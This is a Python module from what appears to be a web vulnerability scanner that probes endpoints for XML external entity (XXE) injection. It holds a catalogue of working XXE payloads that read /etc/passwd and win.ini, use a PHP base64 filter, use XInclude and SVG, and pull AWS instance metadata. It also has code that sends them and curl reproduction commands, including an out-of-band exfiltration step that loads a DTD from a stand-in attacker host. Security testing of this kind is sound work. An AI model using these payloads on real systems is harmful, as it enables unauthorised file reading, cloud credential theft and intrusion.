"""XXE (XML External Entity) injection module.

Tests endpoints for XXE by sending XML payloads as:
  - POST body with XML Content-Types
  - Injected into parameters that already contain XML-like values
  - XInclude attacks (no DOCTYPE required)

Detection is response-based (file content indicators).
"""

import re
from typing import Dict, List, Optional, Tuple

from .base import BaseModule, Finding


# ---------------------------------------------------------------------------
# XXE payload catalogue
# ---------------------------------------------------------------------------
# Each entry: (name, xml_body, [indicator_patterns])
_PAYLOADS: List[Tuple[str, str, List[str]]] = [
    (
        "etc-passwd-file-read",
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<x>&xxe;</x>'
        ),
        [r"root:x:0:0", r"nobody:x:", r"daemon:x:", r"/bin/(?:bash|sh)"],
    ),
    (
        "windows-win-ini",
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///c:/windows/win.ini">]>'
            '<x>&xxe;</x>'
        ),
        [r"\[fonts\]", r"\[extensions\]", r"for 16-bit app"],
    ),
    (
        "php-base64-filter",
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE x [<!ENTITY xxe SYSTEM '
            '"php://filter/convert.base64-encode/resource=/etc/passwd">]>'
            '<x>&xxe;</x>'
        ),
        [r"[A-Za-z0-9+/]{40,}={0,2}"],  # long base64 blob
    ),
    (
        "xinclude-etc-passwd",
        (
            '<x xmlns:xi="http://www.w3.org/2001/XInclude">'
            '<xi:include parse="text" href="file:///etc/passwd"/>'
            "</x>"
        ),
        [r"root:x:0:0", r"nobody:x:"],
    ),
    (
        "blind-aws-metadata",
        (
            '<?xml version="1.0"?>'
            '<!DOCTYPE x [<!ENTITY xxe SYSTEM '
            '"http://169.254.169.254/latest/meta-data/">]>'
            '<x>&xxe;</x>'
        ),
        [r"ami-id", r"instance-id", r"local-ipv4"],
    ),
    (
        "xxe-via-svg",
        (
            '<?xml version="1.0" standalone="yes"?>'
            '<!DOCTYPE x [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            '<svg xmlns="http://www.w3.org/2000/svg">'
            '<text y="50">&xxe;</text></svg>'
        ),
        [r"root:x:0:0", r"nobody:x:"],
    ),
]

_XML_CONTENT_TYPES = [
    "application/xml",
    "text/xml",
    "application/soap+xml",
]

# Param value patterns that suggest XML input is accepted
_XML_VALUE_RE = re.compile(r"<[a-zA-Z][^>]*>|<!DOCTYPE|&[a-z]+;", re.IGNORECASE)


class XXEScanner(BaseModule):
    NAME = "xxe"

    def scan_parameter(
        self,
        url: str,
        method: str,
        params: Dict[str, str],
        param_name: str,
    ) -> List[Finding]:
        findings: List[Finding] = []

        value = params.get(param_name, "")

        # Strategy 1: POST raw XML bodies with XML content-types
        if method == "POST" or not params:
            findings.extend(self._raw_xml_probe(url, param_name))
            if findings:
                return findings

        # Strategy 2: Inject into param if it looks XML-like
        if _XML_VALUE_RE.search(value):
            findings.extend(self._param_xml_inject(url, method, params, param_name))
            if findings:
                return findings

        # Strategy 3: Try anyway if param name hints at XML
        xml_hints = {"xml", "soap", "body", "data", "payload", "content", "input", "request"}
        if param_name.lower() in xml_hints:
            findings.extend(self._raw_xml_probe(url, param_name))

        return findings

    # ------------------------------------------------------------------
    # Probe strategies
    # ------------------------------------------------------------------

    def _raw_xml_probe(self, url: str, param_name: str) -> List[Finding]:
        """POST each XXE payload as a raw XML body."""
        findings: List[Finding] = []
        for pl_name, body, indicators in _PAYLOADS:
            for ct in _XML_CONTENT_TYPES:
                resp = self.http.raw_post(url, body=body, content_type=ct)
                if resp is None:
                    continue
                hit = self._check_indicators(resp.text, indicators)
                if hit:
                    findings.append(self._make_finding(
                        url, "POST", param_name,
                        pl_name, body, hit, is_raw=True,
                    ))
                    return findings
        return findings

    def _param_xml_inject(
        self, url: str, method: str, params: Dict[str, str], param_name: str,
    ) -> List[Finding]:
        """Replace param value with XXE payload and send."""
        findings: List[Finding] = []
        for pl_name, body, indicators in _PAYLOADS:
            test_params = {**params, param_name: body}
            resp = (
                self.http.get(url, params=test_params)
                if method == "GET"
                else self.http.post(url, data=test_params)
            )
            if resp is None:
                continue
            hit = self._check_indicators(resp.text, indicators)
            if hit:
                findings.append(self._make_finding(
                    url, method, param_name,
                    pl_name, body, hit, is_raw=False,
                ))
                return findings
        return findings

    # ------------------------------------------------------------------
    # Helpers
    # ------------------------------------------------------------------

    @staticmethod
    def _check_indicators(text: str, indicators: List[str]) -> Optional[str]:
        for pattern in indicators:
            if re.search(pattern, text):
                return pattern
        return None

    @staticmethod
    def _make_finding(
        url: str, method: str, param_name: str,
        pl_name: str, body: str, indicator: str, is_raw: bool,
    ) -> Finding:
        short_body = body[:120] + ("..." if len(body) > 120 else "")
        how = "raw XML POST body" if is_raw else f"parameter '{param_name}'"

        return Finding(
            vuln_type="XXE (XML External Entity) Injection",
            url=url,
            method=method,
            parameter=param_name,
            payload=short_body,
            evidence=f"Response matches '{indicator}' via {pl_name} ({how})",
            confidence="high",
            details=(
                "The endpoint processes user-supplied XML and resolves external "
                f"entities ({pl_name}).  An attacker can read local files, "
                "perform SSRF to internal services, and in some configurations "
                "achieve remote code execution via XXE-to-RCE chains "
                "(e.g., PHP expect:// wrapper, Java JNDI)."
            ),
            reproduction=(
                f"# Test directly with curl:\n"
                f"$ curl -s -X POST '{url}' \\\n"
                f"  -H 'Content-Type: application/xml' \\\n"
                f"  -d '{body}'\n\n"
                f"# Read /etc/passwd:\n"
                f"$ curl -s -X POST '{url}' \\\n"
                f"  -H 'Content-Type: application/xml' \\\n"
                f"  -d '<?xml version=\"1.0\"?><!DOCTYPE x ["
                f"<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]><x>&xxe;</x>'\n\n"
                f"# Blind SSRF exfil via DNS (replace BURP with Burp Collaborator):\n"
                f"$ curl -s -X POST '{url}' \\\n"
                f"  -H 'Content-Type: application/xml' \\\n"
                f"  -d '<?xml version=\"1.0\"?><!DOCTYPE x ["
                f"<!ENTITY % dtd SYSTEM \"http://BURP/evil.dtd\">%dtd;]><x/>' "
            ),
        )
